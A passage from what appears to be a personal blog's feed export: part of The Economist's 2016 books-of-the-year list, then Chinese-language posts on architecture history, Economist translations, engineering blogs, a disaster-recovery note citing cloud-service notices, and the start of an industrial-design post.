<p><strong>Heart of Europe: A History of the Holy Roman Empire</strong><br>By Peter Wilson. Belknap; 941 pages; $39.95. Allen Lane; £35<br>The Holy Roman Empire, on paper, looked more like a Jackson Pollock painting than a blueprint for modern Europe—and yet it worked well, nonetheless. A masterly retelling, by an Oxford historian.</p>
<p><strong>Lenin on the Train</strong><br>By Catherine Merridale. Allen Lane; 353 pages; £25. To be published in America by Metropolitan in March 2017<br>How Vladimir Lenin’s railway journey from Switzerland to Russia led to the revolution and changed his country—and the world—for ever. An insightful and sympathetic account, by one of the foremost historians of Russia.</p>
<p><strong>East West Street: On the Origins of Genocide and Crimes Against Humanity</strong><br>By Philippe Sands. Knopf; 448 pages; $32.50 Weidenfeld &amp; Nicolson; £20<br>A distinguished Franco-British advocate traces how a single important word entered the legal canon, while examining the lives of those who brought it into being and the wartime experiences of his own Jewish relatives in Europe. An un-put-downable winner of the Baillie Gifford prize for non-fiction.</p>
<h4 id="Economics-and-business"><a href="#Economics-and-business" class="headerlink" title="Economics and business"></a>Economics and business</h4><p><strong>The Rise and Fall of American Growth: The US Standard of Living since the Civil War</strong><br>By Robert Gordon. Princeton University Press; 762 pages; $39.95 and £29.95<br>Why economic growth soared in America in the early 20th century, and why it won’t be soaring again any time soon, by an outspoken economist who teaches at Northwestern University.</p>
<p><strong>Global Inequality: A New Approach for the Age of Globalisation</strong><br>By Branko Milanovic. Belknap; 299 pages; $29.95. Harvard University Press; £23.95<br>Surprisingly little is known about what causes inequality. An economist at the Luxembourg Income Study Centre and the City University of New York proposes a bold and interesting new theory.</p>
<p><strong>The Great Convergence: Information Technology and the New Globalization</strong><br>By Richard Baldwin. Belknap; 329 pages; $29.95 and £22.95<br>Globalisation has changed fundamentally since the internet revolution in the 1990s. Whereas 20th-century trade involved competition between countries, 21st-century trade is fuzzier, with supply chains crossing borders. An American academic, working in Geneva, argues that, while it might be difficult to help the losers, reversing the trend is even harder.</p>
<p><strong>The Man Who Knew: The Life and Times of Alan Greenspan.</strong><br>By Sebastian Mallaby. Penguin Press; 781 pages; $40. Bloomsbury; £25<br>Once a hero, the former chairman of the Federal Reserve is now being called a villain. Sebastian Mallaby, who used to write for The Economist and is married to our editor-in-chief, Zanny Minton Beddoes, examines whether Alan Greenspan was to blame for the financial crisis. Winner of the Financial Times and McKinsey Business Book of the Year award 2016.</p>
<p><strong>Alibaba: The House That Jack Ma Built</strong><br>By Duncan Clark. Ecco; 287 pages; $27.99 and £18.99<br>An intriguing insider’s account of how Jack Ma conquered China’s internet, by an early adviser to the company</p>
<p><strong>Eccentric Orbits: The Iridium Story</strong><br>By John Bloom. Atlantic Monthly Press; 537 pages; $27.50. Grove Press; £16.99<br>The exhaustive (and exhausting) tale of the Iridium communications project and how it was brought back from the dead.</p>
<h4 id="Culture-society-and-travel"><a href="#Culture-society-and-travel" class="headerlink" title="Culture, society and travel"></a>Culture, society and travel</h4><p><strong>Cleverlands: The Secrets Behind the Success of the World’s Education Superpowers</strong><br>By Lucy Crehan. Unbound; 304 pages; £16.99<br>Too much writing about education is polemical and ill-informed. Lucy Crehan’s book is refreshingly fair-minded and makes a case that there is a lot to learn about how other countries learn.</p>
<p><strong>Free Speech: Ten Principles for a Connected World</strong><br>By Timothy Garton Ash. Yale University Press; 491 pages; $30. Atlantic; £20<br>How urbanisation and the spread of the internet has increased the possibilities of freedom of expression, but also the consequences that stem from it. A distillation of a lifetime’s research and writing, by the Oxford academic who also created freespeechdebate.com.</p>
<p><strong>Another Day in the Death of America: A Chronicle of Ten Short Lives</strong><br>By Gary Younge. Nation Books; 267 pages; $25.99. Guardian Faber; £16.99<br>The stories of ten young people who were shot and killed on the arbitrarily selected date of Saturday November 23rd 2013. A “long, doleful, piercing cry”, by a journalist on the Guardian, in a country so overwhelmed by gun violence that it has almost given up trying to stop it.</p>
<p><strong>The Life Project: The Extraordinary Story of Our Ordinary Lives</strong><br>By Helen Pearson. Soft Skull; 256 pages; $17.95 Penguin; £9.99<br>How a random, nationwide sample of people linked only by their birth in 1946 has been followed by researchers and data-gatherers, and helped shape public policy across the country. A jewel in the crown of British social science.</p>
<p><strong>Meetings with Remarkable Manuscripts</strong><br>By Christopher de Hamel. Allen Lane; 632 pages; £30<br>The politics and meaning of medieval manuscripts. A delightful and surprising book, by the man who has examined more manuscripts than anyone before him.</p>
<p><strong>Progress: Ten Reasons to Look Forward to the Future</strong><br>By Johan Norberg. Oneworld; 246 pages; $24.99 and £16.99<br>A Swedish economic historian studies the many, and often surprising, ways in which human life has improved.</p>
<p><strong>The End of Karma: Hope and Fury Among India’s Young</strong><br>By Somini Sengupta. Norton; 244 pages; $26.95 and £18.99<br>How India’s youth are trading fatalism and karma for free will and higher expectations, by a former New York Times New Delhi bureau chief who interweaves data, first-hand accounts and archival research to great effect.</p>
<p><strong>City of Thorns: Nine Lives in the World’s Largest Refugee Camp</strong><br>By Ben Rawlence. Picador; 384 pages; $26. Portobello; £14.99<br>A chronicle of life in Dadaab refugee camp in northern Kenya, which was supposed to close in November, but hasn’t because its inhabitants have nowhere to go.</p>
<p><strong>Beethoven for a Later Age: Living with the String Quartets</strong><br>By Edward Dusinberre. University of Chicago Press; 232 pages; $30. Faber &amp; Faber; £18.99<br>The lead violinist of the Takacs Quartet recounts its members’ musical lives, interweaving into the group’s autobiography the story of Beethoven’s 16 string quartets, which are now regarded as the apogee of the chamber-music repertoire.</p>
<p><strong>How to Listen to Jazz</strong><br> By Ted Gioia. Basic Books; 272 pages; $24.99 and £16.99<br>Why jazz is unique, and how to distinguish good jazz from bad. No author could have done a better job.</p>
<h4 id="Fiction"><a href="#Fiction" class="headerlink" title="Fiction"></a>Fiction</h4><p><strong>The Vegetarian</strong><br>By Han Kang. Translated by Deborah Smith. Hogarth; 192 pages; $21. Portobello; £8.99<br>This slim novella from South Korea is one of the most erotic literary novels of the season. Winner of the 2016 Man Booker International prize.</p>
<p><strong>War and Turpentine</strong><br>By Stefan Hertmans. Translated by David McKay. Pantheon; 304 pages; $26.95. Harvill Secker; £16.99<br>A lovingly reimagined life of an ordinary man whose life was for ever marked by the first world war. Fine prose from a Flemish-Belgian poet and essayist.</p>
<p><strong>The Mandibles: A Family, 2029-2047</strong><br>By Lionel Shriver. Harper; 400 pages; $27.99. Borough Press; £16.99<br>A hilarious, and often brutal, tale of how one family fares when America’s economy collapses. In God they trusted. By the irrepressible author of “We Need to Talk About Kevin”.</p>
<p><strong>Swing Time</strong><br>By Zadie Smith. Penguin Press; 453 pages; $27. Hamish Hamilton; £18.99<br>A powerful story of lives marred by secrets, unfulfilled potential and the unjustness of the world. This may well be Zadie Smith’s finest novel.</p>
<h4 id="Science-and-technology"><a href="#Science-and-technology" class="headerlink" title="Science and technology"></a>Science and technology</h4><p><strong>I Contain Multitudes: The Microbes Within Us and a Grander View of Life</strong><br>By Ed Yong. Ecco; 368 pages; $27.99. Bodley Head; £20<br>A science writer and blogger turns an enthusiastic naturalist’s eye on the bacteria, viruses and other minuscule organisms that cohabit the bodies of humans and other animals. Get to know some little-known villains—and many heroes.</p>
<p><strong>The Gene: An Intimate History</strong><br>By Siddhartha Mukherjee. Scribner; 592 pages; $32. Bodley Head; £25<br>The world is wholly unprepared for the birth of the first human with a genome that has been permanently modified in a lab. By a Pulitzer-winning writer and physician.</p>
<p><strong>Patient HM: A Story of Memory, Madness, and Family Secrets</strong><br>By Luke Dittrich. Random House; 440 pages; $28. Chatto &amp; Windus; £18.99<br>Patient HM became famous in the history of science when a surgeon treated his epilepsy by removing the medial temporal lobes in his brain, causing him to lose most of his memory. A remarkable examination of how neuroscience works, by the surgeon’s grandson.</p>
<p><strong>Cure: A Journey into the Science of Mind over Body</strong><br>By Jo Marchant. Crown; 320 pages; $26. Canongate; £16.99<br>A thought-provoking exploration of how the mind affects the body and can be harnessed to help treat physical illness, by an award-winning science journalist.</p>
<p><strong>The Glass Universe: How the Ladies of the Harvard Observatory Took the Measure of the Stars</strong><br>By Dava Sobel. Viking; 336 pages; $30. To be published in Britain by Fourth Estate in January 2017<br>The hidden history of the remarkable women whose contribution to astronomy changed our understanding of the stars and man’s place in the universe, by the prize-winning author of “Longitude” and “Galileo’s Daughter”.</p>
<p>Our policy is to identify the reviewer of any book by or about someone closely connected with The Economist. Sebastian Mallaby is married to Zanny Minton Beddoes, our editor-in-chief. The review of his book in these pages (“Man in the Dock”, Oct 1st) was written by Martin Wolf, chief economics commentator of the Financial Times. It was edited for length only.</p>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title>建筑学 | Overview of Architecuture</title>
    <url>/2018/12/31/Engineering-Architecture/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Theme_Arch.png" alt></p>
<h2 id="建筑历史"><a href="#建筑历史" class="headerlink" title="建筑历史"></a>建筑历史</h2><p>维特鲁威是两千年前的古罗马建筑师，他撰写的建筑理论著作《建筑十书》中提出了建筑三原则是：“坚固、实用、美观”。</p>
<p>《建筑十书》是西方古典时代唯一幸存下来的建筑全书，也是西方世界有史以来最重要的一本建筑学著作。一部西方建筑史就是一部维特鲁威的接受史，两千年以来，各个历史时期的建筑师和理论家对于维特鲁威的认识和评价，折射出建筑观念的流变，也决定了西方城市与乡村的景观。除了建筑史的价值外，它还是一部真正的古代文化百科全书，广泛涉及哲学、历史、文献学、数学、几何学、机械学、音乐学、天文学、测量学、造型艺术等诸多领域，它所记载的不少史料在其他文献中已无法寻觅，为科技史、文献学与语文学的研究提供了珍贵的史料。</p>
<p>维特鲁威生活在罗马共和制向帝制过渡的重要转折期，他在文化上是一个“保守主义者”，不遗余力地维护着从古希腊继承下来的文化价值观和建筑理想。他在书中所强调的建筑师的通识教育、知识的统一性、建筑的意蕴、理论与实践的关系、建筑与社会伦理、人类健康与环境等问题，至今仍对我们具有重大的启示意义。</p>
<h4 id="中国建筑"><a href="#中国建筑" class="headerlink" title="中国建筑"></a>中国建筑</h4><ul>
<li>《营造法式》| 宋代</li>
<li>《工程做法则例》| 清代</li>
</ul>
<p>《营造法式》是宋微宗（1101－1125年）在位时朝廷中主管营造事务的将作监李诫编撰的。全书共三十四卷，其中十三卷是关于基础、城寨、石作及雕饰，以及大本作（即本构架、柱、梁、枋、额，斗栱等），小本作（即门、窗、幅扇、屏风、平基、佛等），砖瓦作（即砖瓦及瓦饰的官式等级及其用法）和彩画作（即彩画的官式等级和图样），其余各卷是各类术语的释义及估算各种工、料的数据。全书最后四卷是各类木作、石作和彩画的图样。</p>
<p>《工程做法则例》是1734年「雍正十ニ年］由工部刊行的。前二十七卷是二十七种不同建筑如大殿、城楼、住宅、仓库、凉亭等等的筑造规则。每种建筑物的每个构件都有规定的尺寸。这一点与《营造法式》不同，后者只有供设计和计算时用的一般规则和比例。次十三卷是各式斗栱的尺寸和安装法，还有七卷述了门、窗、幅扇、屏风，以及砖作、石作和土作的做法。最后二十四卷是用料和用工的估算。</p>
<p>在宋代，梁的高度与宽度之比大体上是3：2。而依清制，这一比例已改为5：4或6：5，显然是对材料力学的无知所致；更有甚者，还规定梁宽一律为“以柱径加二寸定厚”。看来这是最武断、最不合理的规定。清代所有的梁都是直的，在其官式建筑中已不再使用月梁。</p>
<blockquote>
<p>清代建筑一般的特征是：柱和过梁外形刻板、僵直，屋顶坡度过分陡峭，檐下斗栱很小。可能是《工程做法则例》中那些严格的、不容变通的规矩和尺寸，竟使《营造法式》时代的建筑那种柔和秀丽的动人面貌丧失殆尽。—— 梁思成 《图像中国建筑史》</p>
</blockquote>
<h2 id="建筑职业"><a href="#建筑职业" class="headerlink" title="建筑职业"></a>建筑职业</h2><h2 id="建筑业：从工匠师傅到营造师"><a href="#建筑业：从工匠师傅到营造师" class="headerlink" title="建筑业：从工匠师傅到营造师"></a>建筑业：从工匠师傅到营造师</h2><p>现代意义的建筑师出现在欧洲，最早的建筑师就是总营造师，也成建筑师傅。</p>
<p>建筑师负责设计、购买材料、雇佣工匠，并管理工程施工。16世纪至18世纪中期，欧洲兴起华丽的花型建筑热潮，在建筑师队伍中开始形成了分工，一部分建筑师联合起来专注于进行设计，另一部分建筑师则负责组织、监督施工，也就逐步形成了设计和施工的分离。</p>
<ul>
<li><p>营造师（Master Builder）：作为建筑项目的最高领导者，营造师必须负责跟进整个工程项目。</p>
</li>
<li><p>建造师（Constructor）：起源于英国，负责全面的组织管理，以工程项目施工管理为主业，通常为项目经理或相关负责人。中国建造师分为一级注册建造师（Constructor）和二级注册建造师（Associate Constructor）。</p>
</li>
</ul>
<h2 id="建筑理论"><a href="#建筑理论" class="headerlink" title="建筑理论"></a>建筑理论</h2><blockquote>
<p>建筑师和规划师怒气冲冲地谴责一般城市面貌的平庸与粗俗，提倡在现有城市景观中采用矫揉造作的方法，消除或掩盖低级酒吧间与下等夜总会，或者在新城市景观的语汇中加以排斥。然而，他们大都无法提高也无法代替现有城市面貌，因为他们的企图是徒劳的。他们愈卖力就愈显得无能，并不断冒左右“假专家”的风险。……改进或增加传统要素，扭转周围环境，就能以最简便的方法取得最大的效果，并使我们以不同的方式看到相同的东西。《建筑的复杂性与矛盾性》076</p>
</blockquote>
<h2 id="建筑故事"><a href="#建筑故事" class="headerlink" title="建筑故事"></a>建筑故事</h2><blockquote>
<p>接手建筑公司的活儿，接着完成基地的建设。一开始的时候，物理学家们，尤其是实验物理学家，在他们的实验大楼和设备还没有准备就绪之前，他们无事可做，所以他们就去盖房子，或是帮着盖房子。理论物理学家就不同了，他们不用待在农舍里，可以直接住在基地里，因为他们马上可以开始工作。所以我们立即投入到工作中。当然，这意味着我们每个人都有一块移动黑板，那种有轮子的、可以推来推去的黑板。— 理查德·费曼 《发现的乐趣》</p>
</blockquote>
<h2 id="在线课程"><a href="#在线课程" class="headerlink" title="在线课程"></a>在线课程</h2><h4 id="王贵祥《中西建筑文化赏析》"><a href="#王贵祥《中西建筑文化赏析》" class="headerlink" title="王贵祥《中西建筑文化赏析》"></a>王贵祥《中西建筑文化赏析》</h4><ul>
<li><a href="http://www.archcollege.com/course/details/82.html" target="_blank" rel="noopener">课程链接：《中西建筑文化赏析》</a></li>
<li>讲师：王贵祥。清华大学建筑学院。</li>
</ul>
<p>学术兴趣贯穿中西方建筑历史与理论。主要从事中国古代建筑史的研究，在唐宋时代木结构建筑的构造、比例，古代楼阁建筑，古代城市衍变，佛塔流变等方面，都曾做过研究。 并对应县木塔的现状做过系统的测绘研究。</p>
<h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><h4 id="建筑历史-1"><a href="#建筑历史-1" class="headerlink" title="建筑历史"></a>建筑历史</h4><ul>
<li>《建筑十书》 | [维特鲁威]</li>
<li>《建筑的复杂性与矛盾性》</li>
<li>《图像中国建筑史》| 梁思成</li>
<li>《无为与有位—日本第一位城市规划师浅田孝》</li>
</ul>
<h4 id="建筑行业"><a href="#建筑行业" class="headerlink" title="建筑行业"></a>建筑行业</h4><ul>
<li>英国：皇家特许建造学会（The Chartered Institute of Building，缩写：CIOB），1834年3月6日在伦敦成立，当时名为营造师协会，并由15名总营造师组成，包括汤玛斯·邱比特和威廉·丘比特，以抗衡当时英国建造业工会的势力。</li>
<li>英国：皇家建筑师协会（Royal Institute of British Architects，缩写：RIBA），建筑师职业协会。</li>
<li>英国：里丁大学/雷丁大学（University of Reading）</li>
<li>美国：美国建造师协会（ AIC ）</li>
<li>德国：</li>
<li>香港：<a href="http://www.hkicm.org.hk/index.html" target="_blank" rel="noopener">香港营造师学会</a></li>
</ul>
<h5 id="英国建筑业议会成员单位"><a href="#英国建筑业议会成员单位" class="headerlink" title="英国建筑业议会成员单位"></a>英国建筑业议会成员单位</h5><ul>
<li>ACAI Association of Consultant Approved Inspectors</li>
<li>ACE Association for Consultancy and Engineering</li>
<li>APM Association for Project Management</li>
<li>APS Association for Project Safety</li>
<li>ASFP Association for Specialist Fire Protection</li>
<li>BAFE British Approvals for Fire Equipment</li>
<li>BCS Chartered Institute for IT</li>
<li>BIID British Institute of Interior Design</li>
<li>BRE Building Research Establishment</li>
<li>BSRIA Building Services Research and Information Association</li>
<li>CABE Chartered Association of Building Engineers</li>
<li>CIAT Chartered Institute of Architectural Technologists</li>
<li>CIBSE Chartered Institution of Building Services Engineers</li>
<li>CIOB Chartered Institute of Building</li>
<li>CIHT Chartered Institution of Highways &amp; Transportation</li>
<li>CIPHE Chartered Institute of Plumbing and Heating Engineering</li>
<li>CIRIA Construction Industry Research and Information Association</li>
<li>GF Ground Forum</li>
<li>ICE Institution of Civil Engineers</li>
<li>ICES Chartered Institution of Civil Engineering Surveyors</li>
<li>ICWCI Institute of Clerks of Works and Construction Inspectorate                                                       </li>
<li>​IET-BES Institution of Engineering and Technology - Built Environment Sector</li>
<li>IFE Institution of Fire Engineers</li>
<li>IIRSM International Institute of Risk and Safety Management</li>
<li>ISSE Institute of Specialist Surveyors and Engineers</li>
<li>IStructE Institution of Structural Engineers                                                                                        </li>
<li>IWFM Institute of Workplace and Facilities Management</li>
<li>LABC Local Authorities Building Control</li>
<li>LI Landscape Institute</li>
<li>NHBC National House-Building Council</li>
<li>RIBA Royal Institute of British Architects</li>
<li>RICS Royal Institution of Chartered Surveyors</li>
<li>RTPI Royal Town Planning Institute</li>
<li>SAFed The Safety Assessment Federation</li>
</ul>
<h4 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/" target="_blank" rel="noopener">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/" target="_blank" rel="noopener">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/" target="_blank" rel="noopener">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://site.douban.com/pkupress/widget/notes/199023/note/271180184/" target="_blank" rel="noopener">建筑三原则我们遵守了哪个？ | 王贵祥 </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>专题：The Economist 经济学人</title>
    <url>/2016/04/26/Economist/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>The Economist 翻译文集</li>
<li><a href="http://www.jianshu.com/collection/f2ea0605db4b" target="_blank" rel="noopener">社区 |《经济学人翻译社》</a></li>
<li>Books of the Year</li>
</ul>
<a id="more"></a>
<h2 id="经济学人年度书单"><a href="#经济学人年度书单" class="headerlink" title="经济学人年度书单"></a>经济学人年度书单</h2><ul>
<li><a href="https://riboseyim.github.io/2018/01/30/Economist-Books-Year-2017/" target="_blank" rel="noopener">The Economist:Books of the Year 2017</a></li>
<li><a href="https://riboseyim.github.io/2016/12/09/Economist-Books-Year-2016/" target="_blank" rel="noopener">The Economist:Books of the Year 2016</a></li>
</ul>
<h2 id="经济数据分析"><a href="#经济数据分析" class="headerlink" title="经济数据分析"></a>经济数据分析</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/" target="_blank" rel="noopener">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Visualization-DataSource/" target="_blank" rel="noopener">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="Topic"><a href="#Topic" class="headerlink" title="Topic"></a>Topic</h2><ul>
<li><a href="https://riboseyim.github.io/2018/02/01/Economist-International-Relation/" target="_blank" rel="noopener">国际关系</a></li>
</ul>
<h2 id="翻译文集"><a href="#翻译文集" class="headerlink" title="翻译文集"></a>翻译文集</h2><ul>
<li><a href="http://www.jianshu.com/p/663ffcd0d2a2" target="_blank" rel="noopener">Economist译文:欧洲难民计划：移民危机管理</a></li>
<li><a href="http://www.jianshu.com/p/351bc45763cb" target="_blank" rel="noopener">Economist译文:The Saudi blueprint 沙特王国的改革蓝图</a></li>
<li><a href="http://www.jianshu.com/p/9c5f837030e9" target="_blank" rel="noopener">Economist译文:2016年全球经济形势预测</a></li>
<li><a href="http://www.jianshu.com/p/d525f1a7fd25" target="_blank" rel="noopener">Economist译文:印度电商竞赛</a></li>
<li><a href="http://www.jianshu.com/p/2cfd0b46f1c5" target="_blank" rel="noopener">Economist译文:越共换届－巨变或轮回？</a>（201612封禁）</li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419" target="_blank" rel="noopener">Economist译文:事与愿违的后门程序</a></li>
<li><a href="http://www.jianshu.com/p/ce638dafe225" target="_blank" rel="noopener">Economist译文:当代德国纳粹魅影</a></li>
<li><a href="http://www.jianshu.com/p/f5f55bbe9d57" target="_blank" rel="noopener">Economist译文:自由迁徙的障碍</a>（201612封禁）</li>
<li><a href="http://www.jianshu.com/p/18edbb3023f6" target="_blank" rel="noopener">Economist译文:奢侈品—万金藏獒</a>（201612封禁）</li>
</ul>
<h2 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h2><ul>
<li><a href="http://www.jianshu.com/p/88f20aa63c39" target="_blank" rel="noopener">小说中的经济学:粮食还是罂粟？</a></li>
</ul>
<h2 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h2><p>我正在「经济学人翻译社」和朋友们讨论有趣的话题，你一起来吧？<br><a href="https://t.zsxq.com/bi6i2ne" target="_blank" rel="noopener">https://t.zsxq.com/bi6i2ne</a></p>
<ul>
<li><a href="https://www.jianshu.com/c/f2ea0605db4b" target="_blank" rel="noopener">简书专题|《经济学人翻译社》</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/quanzi-economist-small.png" alt></p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ul>
<li>《行为经济学及其应用》</li>
<li>《现代世界体系－第三卷－1730～1840》(细节太多，需要对欧洲国家关系史深入了解)</li>
<li><a href="http://knowledge.wharton.upenn.edu/article/libor-scandal/" target="_blank" rel="noopener">What’s Behind One of the Biggest Financial Scams in History | knowledge.wharton</a></li>
<li><a href="https://mp.weixin.qq.com/s/hs0MeYXZVsPDjaYH9GAfSg" target="_blank" rel="noopener">协和医院的“号贩子”怎么炼成的？他们为何干这个 | 原创 2016-02-26 刘佳英 财新网</a></li>
<li><a href="https://mp.weixin.qq.com/s/1PPhMeUhQYbq59JfKlsKrQ" target="_blank" rel="noopener">详解《平价医保法（奥巴马医保）》与美国医保的方方面面 | 2016-12-12 北大飞</a></li>
<li><a href="https://mp.weixin.qq.com/s/BqnPYl3RSOFfrRy4NiKllQ" target="_blank" rel="noopener">美国对冲基金吐槽双11数据：我家后院的树长到275米高，你信吗？| 2015-11-12 天使客</a></li>
<li><a href="https://qz.com/1367800/ubernomics-is-ubers-semi-secret-internal-economics-department" target="_blank" rel="noopener">Uber’s secret weapon is its team of economists | By Alison GriswoldOctober 14, 2018</a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title>Engineering Blog</title>
    <url>/2018/09/15/Engineering-Blog/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Study The Master</li>
</ul>
<span id="more"></span>
<h2 id="Study-The-Master"><a href="#Study-The-Master" class="headerlink" title="Study The Master"></a>Study The Master</h2><ul>
<li><a href="https://blog.twitter.com/engineering/en_us.html">Twitter Engineering</a></li>
<li><a href="https://eng.uber.com/">Uber Engineering</a></li>
<li><a href="https://tech.meituan.com/">美团技术团队</a></li>
<li><a href="https://www.confluent.io/blog/">Confluent: Apache Kafka &amp; Streaming Platform for the Enterprise</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>工程设计：容灾设计</title>
    <url>/2019/01/01/Engineering-DisasterRecovery/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h4 id="设计中的失败准备"><a href="#设计中的失败准备" class="headerlink" title="设计中的失败准备"></a>设计中的失败准备</h4><blockquote>
<p>没有琢磨不透的事故，只有意想不到的事故。—— 马克 N.霍伦斯坦</p>
</blockquote>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h4 id="2018-七牛云·域名"><a href="#2018-七牛云·域名" class="headerlink" title="2018 七牛云·域名"></a>2018 七牛云·域名</h4><blockquote>
<p>尊敬的七牛云用户，您好: 如果您正在使用或将要使用测试域名，请务必仔细阅读本邮件内容！ 七牛云测试域名是用户在创建云存储空间时系统自动生成的七牛域名，以 clouddn.com, qiniucdn.com, qiniudn.com, qnssl.com, qbox.me 等结尾，此类域名仅供用户测试不能用于正式生产环境。测试域名不规范使用或被当作正式域名使用，将导致域名的安全风险增加，从而影响用户的正常测试需求。 为了确保测试域名的规范使用，保障七牛云用户的权益，我们将逐步对测试域名加强管理，具体规则如下： [已上线生效] 不得使用测试域名存储、发布、传播违法违规内容。当测试域名下有非法资源时，该域名将被直接冻结并不予解封。如对七牛云及其他用户造成损害，七牛云保留进一步追责的权利。 对 2018 年 7 月 18 日起新产生的测试域名，禁止下载移动应用程序(apk,ipa 等)，请绑定自定义域名进行访问。 [预计生效时间 8 月上旬] ：流量限制 测试域名无论新老测试域名每个自然日限总流量 10GB，当日测试流量达到 10GB 上限后，禁止继续访问。 [预计生效时间 8 月中旬] ：测试域名回收机制 每个测试域名生命周期为 30 个自然日（已有测试域名自回收功能上线之日起算，新产生的测试域名自系统自动生成之日起算），超过 30 日系统将自动回收，回收即为域名删除。 在测试域名生命周期终结之前我们会邮件通知您，您也可以自行在 七牛云-管理控制台 上查看测试域名剩余的回收时间。</p>
</blockquote>
<h4 id="2017-小密圈"><a href="#2017-小密圈" class="headerlink" title="2017 小密圈"></a>2017 小密圈</h4><blockquote>
<p>亲爱的小密圈用户:<br>由于技术升级，您将暂时无法访问小密圈官网、网页版、客户端和小程序。小密圈公众号内的提现功能可正常使用。升级后，我们会更好地服务内容创作者。——小密圈团队</p>
</blockquote>
<p>历史再次证明关键信息放在国内根本靠不住，前有微博、B站，现有小密圈，下一个会是微信公众号吗？<br>完全有可能，谁也不知道。<strong>随时可能变成敏感词，随时可能因为技术原因被消失，白色恐怖、KGB（Komitet gosudarstvennoy bezopasnosti）莫过于此。</strong></p>
<h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><ul>
<li>《 To Engineer is Human: The Role of Failure in Successful Design (1985)》| <a href="https://en.wikipedia.org/wiki/Henry_Petroski" target="_blank" rel="noopener">Henry Petroski</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>工业设计</title>
    <url>/2019/02/06/Engineering-Design/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>工程设计</strong> 的一种定义是，运用工程原理和知识去满足一种实际需要的活动。设计的对象可以是实际设备，如机器、电路或者桥梁结构，也可以是较为抽象的东西，如软件工程、操作系统、网络设备、制造过程或者控制算法。</p>
<p>工程师要完成的是满足一组预先设定的需求，设计的目的是收敛到最佳可能的解决方案。这里的“最佳”包括许多因素：</p>
<ul>
<li>可行性（Feasibility）</li>
<li>准确性（Accuracy）</li>
<li>成本（Cost）</li>
<li>耐久性（Durability）</li>
<li>鲁棒性（Robustness）</li>
<li>安全性（Safety）</li>
</ul>
<h2 id="优秀的设计和糟糕的设计"><a href="#优秀的设计和糟糕的设计" class="headerlink" title="优秀的设计和糟糕的设计"></a>优秀的设计和糟糕的设计</h2><div class="table-container">
<table>
<thead>
<tr>
<th>优秀的设计</th>
